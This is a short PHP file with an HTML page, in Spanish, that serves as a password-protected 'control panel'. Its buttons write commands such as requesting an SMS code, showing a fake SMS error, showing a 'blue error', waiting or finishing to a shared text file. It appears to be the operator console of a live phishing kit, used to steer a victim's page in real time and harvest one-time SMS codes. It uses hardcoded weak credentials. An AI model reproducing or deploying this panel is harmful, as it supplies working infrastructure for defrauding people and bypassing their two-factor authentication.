<?php
// ==========================================
// CONFIGURACIÓN DE SEGURIDAD
// ==========================================
$usuario_panel = "admin";       // Cambia esto por el nombre que quieras
$clave_panel = "12345";         // Cambia esto por tu contraseña secreta

// Verificación de acceso (Pide usuario y contraseña al entrar)
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] !== $usuario_panel || $_SERVER['PHP_AUTH_PW'] !== $clave_panel) {
    header('WWW-Authenticate: Basic realm="Acceso Restringido"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'No tienes permiso para acceder a este panel.';
    exit;
}

// ==========================================
// LÓGICA DEL PANEL
// ==========================================
$archivo_comando = 'comando.txt';

// Si el archivo comando.txt no existe, lo crea
if (!file_exists($archivo_comando)) {
    file_put_contents($archivo_comando, 'esperar');
}

// Actualiza el comando cuando presionas un botón
if (isset($_POST['accion'])) {
    file_put_contents($archivo_comando, $_POST['accion']);
}

$estado_actual = file_get_contents($archivo_comando);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control Seguro</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; width: 100%; max-width: 400px; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
        .status { padding: 15px; margin-bottom: 20px; border-radius: 5px; font-weight: bold; font-size: 1.2em; border: 1px solid #ccc; }
        .esperando { background: #fff3cd; color: #856404; }
        .orden { background: #d1ecf1; color: #0c5460; }
        
        form { display: grid; gap: 10px; }
        button { padding: 15px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-blue { background: #005fa4; }
        .btn-green { background: #28a745; }
        .btn-red { background: #dc3545; }
        .btn-gray { background: #6c757d; }
        .btn-black { background: #333; margin-top: 10px; }
        button:active { opacity: 0.8; transform: scale(0.98); }
    </style>
</head>
<body>

<div class="card">
    <h2>Panel de Control</h2>
    <div class="status <?php echo ($estado_actual == 'esperar') ? 'esperando' : 'orden'; ?>">
        Estado: <?php echo strtoupper($estado_actual); ?>
    </div>

    <form method="POST">
        <button type="submit" name="accion" value="error_azul" class="btn-blue">Mandar Error Azul</button>
        <button type="submit" name="accion" value="pedir_sms" class="btn-green">Pedir Código SMS</button>
        <button type="submit" name="accion" value="error_sms" class="btn-red">Error SMS (Incorrecto)</button>
        <button type="submit" name="accion" value="esperar" class="btn-gray">Poner en Espera</button>
        <button type="submit" name="accion" value="finalizar" class="btn-black">Reiniciar / Finalizar</button>
    </form>
    <p style="font-size: 12px; color: #999; margin-top: 15px;">Sesión protegida para: <?php echo $usuario_panel; ?></p>
</div>

</body>
</html>